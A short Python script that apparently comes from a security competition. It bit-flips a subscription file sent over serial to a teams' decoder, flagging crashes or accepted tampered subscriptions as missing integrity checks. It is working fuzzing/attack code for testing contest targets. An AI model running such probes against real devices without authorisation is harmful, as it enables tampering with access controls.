#!/usr/bin/env python3
# bitflip each bit in the encoded frame and see if decoder crashes or responds with a successful subscribe
# used to detect teams that don't verify subscrption integrity
import asyncio
import os
import sys

from loguru import logger
from serial import SerialTimeoutException

from attack_utils import conn, run_attack

logger.remove()
logger.add(sys.stdout, level="SUCCESS")


def main():
    r = conn()

    with open("../test_out/own.sub", "rb") as f:
        subscription = bytearray(f.read())

    first_vuln = True
    print(f"orig listing: {r.list()}")
    for byte_offset in range(len(subscription)):
        for bit_offset in range(8):
            new_subscription = subscription[:]
            new_subscription[byte_offset] ^= 1 << bit_offset
            try:
                print(byte_offset, bit_offset)
                orig_list = r.list()
                r.subscribe(new_subscription)
                new_list = r.list()
                if new_list != orig_list:
                    if first_vuln:
                        first_vuln = False
                        print(
                            "POTENTIAL VULNERABILITY: flipping bytes in subscription results in valid subscribe, Ctrl-F 'Subscribe bitflip details' in log for more detail"
                        )
                    print(
                        f"Subscribe bitflip details: flipping byte {byte_offset} bit {bit_offset} in subscription results in {new_list}"
                    )
            except SerialTimeoutException:
                # assume decoder crashed
                print(
                    f"POTENTIAL VULNERABILITY: flipping byte {byte_offset} bit {bit_offset} in subscription caused decoder to crash"
                )
                sys.stdout.flush()
                os._exit(0)

            except Exception as e:
                print(e)


if __name__ == "__main__":
    run_attack(main, timeout=90)
